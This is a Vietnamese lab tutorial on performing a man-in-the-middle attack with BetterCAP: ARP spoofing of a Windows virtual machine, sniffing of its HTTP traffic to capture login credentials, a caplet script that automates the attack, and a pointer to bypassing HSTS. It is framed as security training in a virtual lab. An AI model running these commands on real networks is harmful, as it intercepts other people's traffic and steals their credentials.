# Tấn công MITM bằng BetterCAP

<p align="center">
  <img width="30%" src="https://raw.githubusercontent.com/bettercap/media/master/logo.png" />
</p>
BetterCAP là một framework mạnh mẽ, dễ mở rộng và di động được viết bằng Go nhằm cung cấp cho nhà nghiên cứu bảo mật, red teamer và nhà ngược kỹ thuật một giải pháp tất cả trong một dễ sử dụng với tất cả các tính năng họ có thể cần để thực hiện trinh sát và tấn công mạng WiFi, thiết bị Bluetooth Low Energy, thiết bị HID không dây và mạng Ethernet.

_Tài liệu chính thức Bettercap: https://www.bettercap.org/intro/_

_Kho lưu trữ chính thức: https://github.com/bettercap/bettercap_

### Tấn công MITM _(Man-in-the-Middle Attack)_
MITM là một hình thức nghe trộm chủ động trong đó kẻ tấn công tạo kết nối độc lập với nạn nhân và chuyển tiếp tin nhắn giữa họ, khiến họ tin rằng họ đang nói chuyện trực tiếp với nhau qua kết nối riêng tư, trong khi thực tế toàn bộ cuộc trò chuyện được kiểm soát bởi kẻ tấn công.

Tấn công MITM có nhiều biến thể.

### Mục tiêu
* Sniff lưu lượng mạng và thực hiện ARP poisoning.
* Khởi chạy tấn công Man-in-the-Middle.
* Sniff lưu lượng mạng để tìm mật khẩu.

### Yêu cầu
* Máy ảo Kali Linux.
* Bất kỳ máy ảo Windows nào (7, 8, 10 hoặc Server).

***

## Cài đặt BetterCAP
Khởi chạy Kali Linux, mở cửa sổ Terminal mới và nhập các lệnh sau:

`apt-get update`
`apt-get install bettercap`

## Các module BetterCAP 
Để khởi chạy chương trình, nhập `bettercap` và chỉ định giao diện mạng hiện tại của bạn: 

`bettercap -iface eth0`

Nhập **help** để liệt kê tất cả các module có sẵn:

`help`

![modules](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/7e4aa214016257e51ca5c19231801f0554de6134/bettercap-1.png)

Module **events.stream** đang **chạy** theo mặc định, module này được bật theo mặc định và chịu trách nhiệm báo cáo các sự kiện (log, máy chủ mới được tìm thấy, v.v.) được tạo bởi các module khác trong phiên tương tác. Hơn nữa, nó có thể được sử dụng để thực thi lệnh theo chương trình khi các sự kiện cụ thể xảy ra.

**Để thực hiện tấn công MITM chúng ta sẽ sử dụng các module dưới đây:**

module | Mô tả 
-- | --
`net.probe` | Khi được kích hoạt, module này sẽ gửi các loại gói thăm dò khác nhau đến mỗi IP trong subnet hiện tại để module net.recon phát hiện chúng. [[+]](https://www.bettercap.org/modules/ethernet/net.probe/)
`net.recon` | Module này chịu trách nhiệm đọc bảng ARP hệ thống định kỳ để phát hiện máy chủ mới trên mạng. [[+]](https://www.bettercap.org/modules/ethernet/net.recon/)
`arp.spoof` | Module này liên tục giả mạo các máy chủ được chọn trên mạng bằng các gói ARP được tạo để thực hiện tấn công MITM. [[+]](https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof/)
`net.sniff` | Module này là packet sniffer và fuzzer mạng hỗ trợ cả cú pháp BPF và biểu thức chính quy để lọc. Nó cũng có thể phân tích nhiều giao thức chính để thu thập thông tin đăng nhập. [[+]](https://www.bettercap.org/modules/ethernet/net.sniff/)

_Bạn có thể nhập `help` theo sau là tên `module` để lấy thông tin chi tiết:_
![b2](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/c2be3479c96a94b3d2c042e8c8c4df20a4a06b57/bettercap-2.png)


## Thiết lập các module để thực hiện ARP spoofing


1. Khởi chạy module **prober** để gửi các loại gói thăm dò khác nhau đến mỗi IP trong subnet hiện tại để module **net.recon** phát hiện chúng. _(Lưu ý: module prober có thể tự động khởi chạy module net.recon)._
`net.probe on`

```
10.0.2.0/24 > 10.0.2.42  » net.probe on
10.0.2.0/24 > 10.0.2.42  » [11:43:32] [sys.log] [inf] net.probe starting net.recon as a requirement for net.probe
10.0.2.0/24 > 10.0.2.42  » [11:43:32] [endpoint.new] endpoint 10.0.2.3 detected as 07:00:27:11:6c:7d .
10.0.2.0/24 > 10.0.2.42  » [11:43:33] [endpoint.new] endpoint 10.0.2.43 detected as 07:00:27:81:d6:f2 .
```
Trong lab của tôi, **10.0.2.43** là máy ảo Windows, điều này có thể khác với môi trường ảo của bạn.

2. Bắt đầu khám phá máy chủ mạng:
`net.recon on`

* Lưu ý: bạn có thể nhập `net.show` để xem tất cả các client đang kết nối hiển thị địa chỉ IP và địa chỉ MAC.

3. Đặt tùy chọn **fullduplex** của module **arp.spoof** thành **true**. Khi bạn đặt thành true, cả mục tiêu và gateway đều sẽ bị tấn công, nếu không chỉ có mục tiêu (nếu router có cơ chế bảo vệ ARP spoofing điều này sẽ khiến cuộc tấn công thất bại).
`set arp.spoof.fullduplex true`

4. Chỉ định mục tiêu để spoof. _(Danh sách phân tách bằng dấu phẩy của địa chỉ MAC, địa chỉ IP, phạm vi IP hoặc bí danh để spoof)._
`set arp.spoof.targets 10.0.2.43`

5. Khởi chạy ARP spoofer:
`arp.spoof on`

```
10.0.2.0/24 > 10.0.2.42  » [12:03:58] [sys.log] [inf] arp.spoof enabling forwarding
10.0.2.0/24 > 10.0.2.42  » [12:03:58] [sys.log] [war] arp.spoof full duplex spoofing enabled, if the router has ARP spoofing mechanisms, the attack will fail.
10.0.2.0/24 > 10.0.2.42  » [12:03:58] [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets.
```

6. Khởi chạy packet sniffer:
`net.sniff on`

7. Nhập `help` để liệt kê các module đang chạy:
![modules2](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/9b7efcd559aef438cbbf1aa8a14ceeced52b19d5/bettercap-3.png)

### ARP spoofing
Bettercap đang đánh lừa **router** và **máy mục tiêu (Windows)**, đặt **máy tấn công (Kali)** vào giữa kết nối.

![arp](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/913307b303fe83f04dd10b2c9760fe370e95a1e6/arp-4.png)

**Trên máy Windows** của tôi, tôi sẽ sử dụng **lệnh bảng arp** để xem những gì đang xảy ra:

![arp5](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/af2872eca1b4d3ecf5c2b3979d8ffd33d1652186/arp-5.png)

Như bạn có thể thấy, máy Windows 'nghĩ' rằng địa chỉ MAC của **router** giống với **Kali** vì bảng ARP đã bị giả mạo.


### Tạo một số lưu lượng chung trên máy mục tiêu.

1. Đăng nhập vào máy ảo Windows của bạn.
2. Khởi chạy trình duyệt và nhập URL: http://testhtml5.vulnweb.com
3. Đăng nhập vào trang web kiểm thử lỗ hổng này với thông tin đăng nhập mẫu: **user: admin | password: password**.

### Bắt và phân tích mọi request
* Quay lại Bettercap trên máy Kali và phân tích tất cả các request được gửi từ Windows.

![b7](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/e27e815cbb390ab5c7d5928fe897f49a71cf73ce/bettercap-7.png)

Như bạn có thể thấy, chúng tôi đã bắt được thông tin đăng nhập được gửi đến trang web. Bất cứ thứ gì máy mục tiêu gửi và nhận đều sẽ được bắt bởi máy Kali Linux.

_**Lưu ý**: kỹ thuật này hoạt động trên trang web HTTP không phải HTTPS. Để thực hiện hành động này bạn cần bypass HSTS (HTTP Strict Transport Security). Bạn có thể thực hiện kỹ thuật này bằng Bettercap và caplet [hstshijack](https://github.com/bettercap/caplets/tree/master/hstshijack)._

## Tự động hóa BetterCAP bằng Caplets
Để hiệu quả hơn trong công việc, bạn có thể tự động hóa phần thiết lập module bằng cách tạo một **tệp Caplet** đơn giản (file.cap) và thêm các lệnh trên mỗi dòng.

1. Tạo caplet:
`touch spoof.cap`

2. Thêm các lệnh và lưu:
`nano spoof.cap`

```sh
net.probe on
set arp.spoof.fullduplex true 
set arp.spoof.targets 10.0.2.5
arp.spoof on
set net.sniff.local true
net.sniff on
```
Như bạn có thể thấy đây là các lệnh tương tự theo thứ tự bạn đã sử dụng trước đó.

3. Khởi chạy **Bettercap** bằng **Caplet** spoof mà bạn đã tạo:
`bettercap -iface eth0 -caplet spoof.cap`
